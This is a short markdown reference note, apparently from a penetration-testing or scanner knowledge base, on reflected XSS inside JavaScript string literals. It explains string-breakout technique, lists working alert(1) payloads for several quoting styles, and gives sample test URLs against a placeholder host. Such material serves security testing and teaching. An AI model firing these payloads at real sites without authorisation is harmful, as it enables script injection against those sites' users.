---
tags: xss, reflected, javascript-string, script-block, js-string, script-context, encoded, tier2
category: xss
---

# Reflected XSS — JavaScript String Context

## Pattern

Input reflected inside a JavaScript string literal in a `<script>` block.
Angle brackets are often encoded, but the string delimiter (`"` or `'`) is not.

```html
<script>
var search = "USER_INPUT";
doSearch(search);
</script>
```

## Why HTML tag payloads fail

```
Payload: <script>alert(1)</script>
Server encodes: &lt;script&gt;alert(1)&lt;/script&gt;
Result in script block: var search = "&lt;script&gt;...";
Not executed — it's just a string value.
```

## The correct approach: break out of the string

The key is to terminate the string literal and inject JS statements.
No HTML tags needed.

```javascript
// Payload: "-alert(1)-"
var search = ""-alert(1)-"";
//                ^ Arithmetic expression — alert executes
```

Or terminate completely:
```javascript
// Payload: ";alert(1)//
var search = "";alert(1)//";
//                    ^ New statement — alert executes, rest commented out
```

## Working payloads — double-quoted string

```
"-alert(1)-"
";alert(1)//
";alert(1);"
"||alert(1)||"
"\x3cscript\x3ealert(1)\x3c/script\x3e    <- unicode escape bypass
```

## Working payloads — single-quoted string

```
'-alert(1)-'
';alert(1)//
'||alert(1)||'
```

## Working payloads — template literal (backtick)

```
`-alert(1)-`
`;alert(1)//
${alert(1)}
```

## Detection: what to look for

```
context      = script_string_double | script_string_single | script_string_template
script_quote = double | single | template
encoded      = ['<', '>']     <- angles blocked
raw_chars    = ['"']          <- quote is raw -> can break out
```

## Test URL format

```
https://target.com/search?q="-alert(1)-"
https://target.com/search?q=";alert(1)//
```

